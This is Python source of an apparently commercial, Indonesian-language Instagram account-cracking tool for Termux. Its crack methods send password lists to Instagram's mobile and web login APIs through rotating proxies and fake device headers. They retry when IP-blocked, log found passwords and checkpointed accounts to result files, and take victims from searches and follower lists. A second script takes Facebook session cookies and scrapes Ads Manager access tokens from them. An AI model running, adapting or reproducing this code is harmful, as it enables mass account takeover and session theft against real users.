				head = {'X-IG-Connection-Speed': f'{rr(111,3700)}kbps', 'Accept': '*/*', 'X-IG-Connection-Type': rc(['MOBILE(LTE)', 'WIFI']), 'X-IG-App-ID': '124024574287414', 'Accept-Encoding': 'br, gzip, deflate', 'Accept-Language': 'id-ID', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'X-IG-ABR-Connection-Speed-KBPS': '0', 'Content-Length': f'{len(str(date))}', 'User-Agent': self.ua_baru(), 'Connection': 'keep-alive', 'X-IG-Capabilities': '36r/dw=='}
				xnxx = ses.post("https://i.instagram.com/api/v1/accounts/login/", data=date, headers=head)
				logtemp +=1
				ncek=json.loads(xnxx.text)
				if "logged_in_user" in str(ncek):
					success.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
					print("")
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{xnxx.text}\n')
					break
				elif 'https://i.instagram.com/challenge' in str(xnxx.text):
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
					print("")
					open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					checkpoint.append(user)
					open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{xnxx.text}\n')
					break
				elif 'ip_block' in str(xnxx.text) or 'spam' in str(xnxx.text):
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(10);self.crackAPI2(user,pas)
					open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{xnxx.text}\n{N}\n')
					loop-=1
					break
				else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{xnxx.text}\n{N}\n')
			except requests.exceptions.ConnectionError:
				prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
				prog.advance(des)
				time.sleep(5)
				self.crackAPI2(user,pas)
				loop-=1
				break
		loop+=1
	def crackAPI(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		logtemp=0
		if logtemp > 10:
			logtemp=0
		prx=random.choice(prox)
		xxx={"http": f"socks4://{prx}"}
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		verig=HARIS["IGV"]
		ua=self.ua_ran()
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		prog.update(des,description=f"[{acakrich}crack[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw.replace(' ','+'),"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					pasw=pw.replace(' ','+')
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pasw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=respon.text
					logtemp+=1
					if "logged_in_user" in str(ncek):
						success.append(user)
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						try:
							print("")
							prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
							break
						except:
							prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
							print("")
							open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
							break
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						print("")
						prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
						print("")
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
						checkpoint.append(user)
						open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
						break
					elif 'ip_block' in str(respon.text) or 'spam' in str(respon.text):
						prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
						prog.advance(des)
						time.sleep(10);self.crackAPI(user,pas)
						open('.logCrack','a').write(f'{M}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
						loop-=1
						break
					else:open('.logCrack','a').write(f'{N}╭({loop}) {user} || {pw}\n╰{respon.text}\n{N}\n')
				except requests.exceptions.ConnectionError:
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(5)
					self.crackAPI(user,pas)
					loop-=1
					break
		loop+=1
	def ua_ig(self):
	   rr=random.randint
	   rc=random.choice
	   mmmx=rc(["RMX3363","RMX3241","RMX3081","RMX3363","RMX3201","RMX1851"])
	   abatu = ''.join((random.choice('ABCDEFGHIJKLM1234567890NOPQRSTUVWXYS')) for _ in range(6))
	   return (f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; REALME {str(mmmx)} Build/{str(abatu)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(50,70)}.0.{random.randint(3000,4000)}.{random.randint(80,120)} Mobile Safari/537.36")
	def ajax(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		prog.update(des,description=f"[{acakrich}crack[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		ua=self.ua_ig()
		for pw in pas:
			try:
				ses.get('https://www.instagram.com/web/__mid')
				head={'Host': 'www.instagram.com','Accept':'*/*','Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.9','Content-Length':'353','Content-Type':'application/x-www-form-urlencoded','Origin':'https://www.instagram.com','Referer':'https://www.instagram.com/accounts/login/?force_classic_login=&','Sec-Ch-Ua':'"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','Sec-Ch-Ua-Full-Version-List':'"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.134", "Google Chrome";v="114.0.5735.134"','Sec-Ch-Ua-Mobile':'?0','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','User-Agent': ua,'X-Asbd-Id':'129477','X-Csrftoken': ses.cookies['csrftoken'],'X-Ig-App-Id':'936619743392459','X-Ig-Www-Claim':'hmac.AR05k4r4Hi4qW2gWrhumyq_wGultMubwNGuatj_4cas9Lr1e','X-Instagram-Ajax':'1007725354','X-Requested-With':'XMLHttpRequest'}
				data = {'enc_password': self.encpwd(pw),'optIntoOneTap': 'false','queryParams': {},'trustedDeviceRecords': {},'username':user}
				respon=ses.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/',headers=head,data=data)
				haris=json.loads(respon.text)
				if "userId" in str(haris) or "sessionid" in ses.cookies.get_dict():
					success.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
					print("")
					open('.logCrack','a').write(f'{H}╭({H}{loop}{H}) {H}{user} {H}|| {H}{pw}\n{H}╰{H}{respon.text}\n')
					open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif "/challenge/action" in str(haris):
					checkpoint.append(user)
					nama,pengikut,mengikut,postingan=self.APIinfo(user)
					print("")
					prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
					print("")
					open('.logCrack','a').write(f'{K}╭({K}{loop}{K}) {K}{user} {K}|| {K}{pw}\n{K}╰{K}{respon.text}\n')
					open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					break
				elif 'ip_block' in str(respon.text):
					prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
					prog.advance(des)
					time.sleep(10)
				else:
					open('.logCrack','a').write(f'{N}╭({N}{loop}{N}) {N}{user} {N}|| {N}{pw}\n{N}╰{N}{respon.text}\n')
			except requests.exceptions.ConnectionError:
				prog.update(des,description=f"{M2}[SPAM][/] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
				prog.advance(des)
				time.sleep(5)
			#except Exception as e:prints(e)
		loop+=1

	def checkAPI(self,user,pas):
		global loop,success,checkpoint
		ses=requests.Session()
		logtemp=0
		if logtemp > 10:
			logtemp=0
		guid = str(uuid.uuid4())
		ponid=str(uuid.uuid4())
		andro="android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
		ig_sig=HARIS["ig_sig"]
		verig=HARIS["IGV"]
		igver=verig.split(",")
		ua=self.ua_baru()
		dat=HARIS["sinkz"]
		dat.update({"id": guid})
		data1=json.dumps(dat)
		ned=hmac.new(ig_sig.encode('utf-8'), str(data1).encode('utf=8'),hashlib.sha256).hexdigest()
		data2=HARIS["sinkz1"]
		data2.update({'signed_body': f'{ned}.{str(data1)}'})
		head=HARIS["headaing"]
		head.update({"user-agent": ua})
		while True:
				try:
					p=ses.post(HARIS["sinkz2"],headers=head,data=data2)
					break
				except:pass
		prog.update(des,description=f"[{acakrich}crack[/]] {str(loop)}/{len(internal)} OK : -[bold green]{len(success)}[/] CP : -[bold yellow]{len(checkpoint)}[/]")
		prog.advance(des)
		for pw in pas:
				try:
					data=json.dumps({"phone_id":ponid,"_csrftoken": ses.cookies["csrftoken"],"username":user,"guid":guid,"device_id":andro,"password": pw.replace(' ','+'),"login_attempt_count": str(logtemp)})
					ned=hmac.new(ig_sig.encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()
					head2=HARIS["headaing1"]
					head2.update({"user-agent": ua})
					sianjing=HARIS["sianjing"]
					setan=sianjing.split("||")
					pasw=pw.replace(' ','+')
					dataa=f'{setan[0]}{ned}{setan[1]}{ponid}{setan[2]}{ses.cookies["csrftoken"]}{setan[3]}{user}{setan[4]}{guid}{setan[5]}{andro}{setan[6]}{pasw}{setan[7]}{logtemp}{setan[8]}'
					respon=ses.post(HARIS["crack"],headers=head2,data=dataa)
					try:
						ncek=json.loads(respon.text)
					except:
						ncek=respon.text
					logtemp+=1
					if "logged_in_user" in str(ncek):
						success.append(user)
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						prints(Panel(f'\r{P2}[{H2}✓{P2}] Nama      : {H2}{nama}                \n{P2}[{H2}✓{P2}] Username  : {H2}{user}                \n{P2}[{H2}✓{P2}] Password  : {H2}{pw}                \n{P2}[{H2}✓{P2}] Pengikut  : {H2}{pengikut}                \n{P2}[{H2}✓{P2}] Mengikuti : {H2}{mengikut}                \n{P2}[{H2}✓{P2}] Postingan : {H2}{postingan}',title=f"{H2}LIVE",width=80,padding=(0,4),style=""))
						open(f"result/success/success-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					elif 'https://i.instagram.com/challenge' in str(respon.text):
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}CHECKPOINT",width=80,padding=(0,4),style=""))
						open(f"result/checkpoint/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{pengikut}|{mengikut}\n')
					elif 'Please wait a few minutes' in str(respon.text):
						sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
					else:
						nama,pengikut,mengikut,postingan=self.APIinfo(user)
						prints(Panel(f'\r{P2}[{K2}X{P2}] Nama      : {K2}{nama}                \n{P2}[{K2}X{P2}] Username  :{K2} {user}                \n{P2}[{K2}X{P2}] Password  :{K2} {pw}                \n{P2}[{K2}X{P2}] Pengikut  : {K2}{pengikut}                \n{P2}[{K2}X{P2}] Mengikuti : {K2}{mengikut}                \n{P2}[{K2}X{P2}] Postingan : {K2}{postingan}',title=f"{K2}Akun telah diganti password",width=80,padding=(0,4),style=""))
				except requests.ConnectionError:
					sys.stdout.write(f"\r{M} ! terkena spam, aktifkan mode pesawat ");sys.stdout.flush();sleep(10)
				except Exception as e:prints(e)
				self.checkAPI(user,pw)
	def cek_hasil(self):
		no,nom = 0,[]
		urut = []
		prints(Panel(f"\t[{bc}!{hapus}] Cek hasil akun crack", padding=(0,4),style=""))
		urut.append(Panel(f"[1] Cek hasil akun {H2}success{hapus}",padding=(0,5),style=""))
		urut.append(Panel(f"[2] Cek hasil akun {K2}checkpoint{hapus}",padding=(0,5),style=""))
		self.tol.print(Columns(urut))
		one=input("Pilihanmu : ")
		if one in ['1','01']:
			try:ok = os.listdir('result/success/')
			except:prints(f" [{M2}!{hapus}] tidak ada hasil success");time.sleep(1);self.menu()
			for x in ok:
				nom.append(x)
				no+=1
				try:jum= open('result/success/'+x,'r').readlines()
				except:continue
				print(f' [{H}{no}{N}] {x} - {H}{len(jum)} {N}akun')
			abc = input(f' [{H}?{N}] nomor file : ')
			file = nom[int(abc)-1]
			try:buka = open('result/success/'+file,'r').read()
			except:prints(f" [{M2}!{hapus}] tidak hasil success");time.sleep(1);self.menu()
			print("")
			print( H+buka+N)
			input(f'\n[{H}!{N}] tekan enter untuk kembali');self.menu()
		elif one in ['2','02']:
			try:ok = os.listdir('result/checkpoint/')
			except:prints(f" [{M2}!{hapus}] tidak hasil success");self.menu()
			for x in ok:
				nom.append(x)
				no+=1
				try:jum= open('result/checkpoint/'+x,'r').readlines()
				except:continue
				print(f' [{K}{no}{N}] {x} - {K}{len(jum)} {N}akun')		
			abc = input(f' [{H}?{N}] nomor file : ')
			file = nom[int(abc)-1]
			try:buka = open('result/checkpoint/'+file,'r').read()
			except:prints(f" [{M2}!{hapus}] tidak hasil checkpoint");time.sleep(1);self.menu()
			print("")
			print( K+buka+N)
			input(f'\n[{H}!{N}] tekan enter untuk kembali');self.menu()
		else:print(f" [{M}!{N}] isi yang benar");time.sleep(2);self.menu()
	def menu(self):
		self.logo()
		c=input(f'  {N}[•] Pilih :{C}  ')
		if c=='':
			self.menu()
		elif c in ('1','01'):
			mas='[•] Masukan nama random untuk di searching'
			mas1=nel(mas,style='')
			sol().print(mas1)
			nama=input(f'{N}  [!] Masukan nama :{N} ')
			pr=f"[!] tekan {M2}CTRL + C{hapus} untuk berhenti dump username"
			so=nel(pr,style="")
			sol().print(so)
			name=self.searchAPI(self.cookie,nama)
			self.passwordAPI(name)
		elif c in ('2','02'):
			pr='[•] CRACK DARI PENGIKUT'
			po=nel(pr,style='')
			sol().print(po)
			nama = input(f'{H}• {N}masukan username : {H}{N}')
			pr=f"[!] tekan {M2}CTRL + C{hapus} untuk berhenti dump username"
			so=nel(pr,style='')
			sol().print(so)
			user = self.convert(nama)
			self.followers(user, "")
		elif c in ('3','03'):
			pr='[•] CRACK DARI MENGIKUTI'
			po=nel(pr,style='')
			sol().print(po)
			nama = input(f'{H}• {N}masukan username : {H}{N}')
			pr=f"[!] tekan {M2}CTRL + C{hapus} untuk berhenti dump username"
			so=nel(pr,style='')
			sol().print(so)
			user = self.convert(nama)
			self.following(user, cokz="")
		elif c in ('4','04'):
			print('')
			for i in os.listdir('result/checkpoint/'):
				print(f' [{U}!{C}] {i}')
			c=input(f'\n [{CY}?{N}] Masukan nama file: {C}')
			g=open("result/checkpoint/%s"%(c)).read().splitlines()
			print(f'\n{CY} [+] Total Result {H}{len(g)}{C}')
			print(f'\n{CY}┣[!] Proses mengecek status akun. silahkan tunggu sebentar{C}\n')
			for s in g:
				user=s.split('|')[0]
				pwd=s.split('|')[1]
				self.checkAPI(user,pwd)
			wel='# CRACK ULANG SELESAI'
			cik2=mark(wel ,style='green')
			sol().print(cik2)
			exit()
		elif c in ('5','05'):
			self.cek_hasil()
		elif c in ('6','06'):
			global following
			six=0
			print(f'\n [{U}!{C}] Bot Unfollow-All Dijalankan\n')
			nama="unfollow"
			x=open('.kukis.log','r').read()
			x_id=re.findall('sessionid=(\d+)',x)[0]
			back=self.followers(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',x_id,nama)
			for i in following:
				six+=1
				sleep(float( random.uniform(nyMnD*10,nyMxD*10) / 10 ))
				six_id=self.sixAPI(i)
				print(f' {str(six)}{U} {C} {i} {H}Unfollow-Berhasil{C}')
				self.unfollowAPI(six_id,'5452333948',self.cookie)
				#print(w)
			input(f'\n\n [{U}#{C}] Unfollow-all selesai...');self.menu()
		elif c in ('r','R'):
			self.BUG()
		elif c in ('c','C'):
			self.ChangeLog()
		elif c in ('e','E'):
			self.Exit()
		else:
			self.menu()

def register_device():
	while True:
		clear()
		banner()
		if os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			key = open("/data/data/com.termux/files/usr/etc/.license","r").read()
			check = requests.get("https://pastebin.com/raw/s0j98G8v").text
			if key in check:
				clear()
				banner()
				lisensiku.append("sukses")
				cetak(nel(f" {H2} Key anda telah di konfirmasi ✓{hapus}"))
				time.sleep(1.5)
				login_kamu()
			else:
				pr=(f'# YOUR KEY : {key}')
				po=mark(pr,style='green')
				cetak(nel(po, style= ''))
				cetak(nel(f"[•] {M2}Key anda belum di konfirmasi{hapus}\n[•] {M2}Silahkan Beli Ke Wa {hapus}{H2}+6283114591358{hapus}{M2} untuk menggunakan sc{hapus}"))
				buy_key=input('  Tekan enter untuk chat whatsapp author untuk membeli key')
				if buy_key in [""]:pass
				jalan(f'  Anda akan diarahkan ke whatsapp author');time.sleep(2)
				os.system(f'xdg-open http://wa.me/+6283114591358?text=Bang+beli+key+sc+instagram+{key}')

		if not os.path.exists("/data/data/com.termux/files/usr/etc/.license"):
			key_gen = random.randint(10000000,99999999)
			enc_key = base64.b16encode(str(key_gen).encode()).decode("utf-8")
			with open("/data/data/com.termux/files/usr/etc/.license","w") as tulis:
				tulis.write(enc_key)
			
			continue
		
		break
if __name__=='__main__':
	ses=requests.Session()
	try:os.mkdir('result')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
#	try:os.system('mkdir result/success')
#	except:pass
#	try:os.system('mkdir result/checkpoint')
#	except:pass
	try:
		ko = ses.get('https://pastebin.com/raw/yt7Q1gtq').json()
		HARIS1.update(ko)
		ki = ses.get('https://pastebin.com/raw/f8z7gBDf').json()
		HARIS.update(ki)
	except Exception as e:
		prints(e)
	login_kamu()
def menu():
	print(f'->  PILIH MENU 3 UNTUK LOGIN KE DALAM MENU SMZ')
	print(f"""[01] Login Cookie V1\n[02] Login Cookie V2\n[03] Login Cookie V3""")
	menu = input('\n[?] Pilih : ')
	if menu in ['1']:
		os.system('rm -rf .tokenku.txt')
		os.system('rm -rf .cokieku.txt')
		token1()
	elif menu in ['2']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cok.txt')
		token2()
	elif menu in ['3']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf cok.txt')
		token3()
	else:
		exit()

def token1():
	try:
		ses = requests.Session()
		cookie = input('\n[?] MASUKAN COOKIE : ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".tokenku.txt", "w").write(tok)
		cokiew = open(".cokieku.txt", "w").write(cookie)
		print('[✓] LOGIN BERHASIL')
		os.system('python runx.py')
	except Exception as e:
		os.system('rm -rf .cok.txt && rm -rf .tok.txt')
		print(e)
		exit()


def token2():
	try:
		ses = requests.Session()
		print(f' LOGIN COKIE V2')
		cookie = input('\n[?] Cookie : ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		os.system('python runx.py')
	except Exception as e:
		os.system('rm -rf c.txt && rm -rf t.txt')
		print(e)
		exit()

def token3():
	try:
		ses = requests.Session()
		print(f'LOGIN COOKIE V3')
		cookie = input('\nCOKIE : ')
		cookies = {'cookie':cookie}
		url = 'https://www.facebook.com/adsmanager/manage/campaigns'
		req = ses.get(url,cookies=cookies)
		set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
		nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
		roq = ses.get(nek,cookies=cookies)
		tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
		tokenw = open(".token.txt", "w").write(tok)
		cokiew = open(".cok.txt", "w").write(cookie)
		os.system('python smok.py')
		#print('\nLogin Berhasil , file tersimpan di token.txt & cok.txt')
	except Exception as e:
		os.system('rm -rf cok.txt && rm -rf token.txt')
		print(e)
		exit()

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	os.system('clear')
	menu()
